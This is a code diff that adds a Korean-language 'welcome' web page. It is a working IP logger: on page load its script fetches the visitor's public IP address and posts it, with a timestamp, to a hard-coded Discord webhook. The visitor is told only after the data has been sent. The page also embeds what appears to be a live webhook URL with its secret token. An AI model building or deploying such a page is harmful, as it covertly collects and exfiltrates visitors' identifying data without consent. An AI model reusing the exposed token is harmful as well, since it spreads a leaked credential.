@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>접속 기록 중...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f0f2f5;
+      font-family: sans-serif;
+    }
+    .box {
+      text-align: center;
+      background: white;
+      padding: 50px 60px;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      max-width: 380px;
+    }
+    h1 { color: #5865F2; margin-bottom: 20px; }
+    #status {
+      padding: 16px;
+      border-radius: 10px;
+      font-size: 1.1em;
+      min-height: 60px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h1>페이지에 오신 걸 환영합니다</h1>
+    <p>잠시만 기다려주세요...</p>
+    <div id="status">접속 정보를 기록 중입니다...</div>
+  </div>
+
+  <script>
+    window.addEventListener('load', async () => {
+      const status = document.getElementById('status');
+
+      try {
+        // 1. 방문자 IP 가져오기 (가장 안정적인 무료 API)
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        if (!ipRes.ok) throw new Error('IP 가져오기 실패');
+        const { ip } = await ipRes.json();
+
+        const now = new Date().toISOString();
+
+        // 2. 보낼 메시지 (최대한 간단하게 - embeds도 최소)
+        const payload = {
+          content: `새 방문자 IP: \`${ip}\` | 시간: ${now} | Busan`,
+          // embeds: []  // 필요하면 나중에 추가
+        };
+
+        // ★★★ 새로 만든 Discord 웹훅 URL 여기 넣기! ★★★
+        // 기존 URL은 이미 여러 번 공유돼서 위험 → 무조건 새로 생성하세요
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1462740711928631500/FSLrgC2DDtpHqmGdw8oCjcXQ96Eics1AhAj2bubhMnTIE3aIe3KDGIlBTEYobj7LK1G5";
+
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          mode: 'no-cors',                  // Discord CORS 문제 때문에 필수!
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        // 성공 시
+        status.innerHTML = "접속 기록 완료 ✓<br>당신의 IP가 Discord에 저장되었습니다.";
+        status.style.backgroundColor = '#d4edda';
+        status.style.color = '#155724';
+
+      } catch (err) {
+        console.error('전송 실패 상세:', err);
+        status.innerHTML = "기록에 실패했습니다 ㅠㅠ<br>콘솔(F12) 확인 부탁드려요";
+        status.style.backgroundColor = '#f8d7da';
+        status.style.color = '#721c24';
+      }
+    });
+  </script>
+
+</body>
+</html>
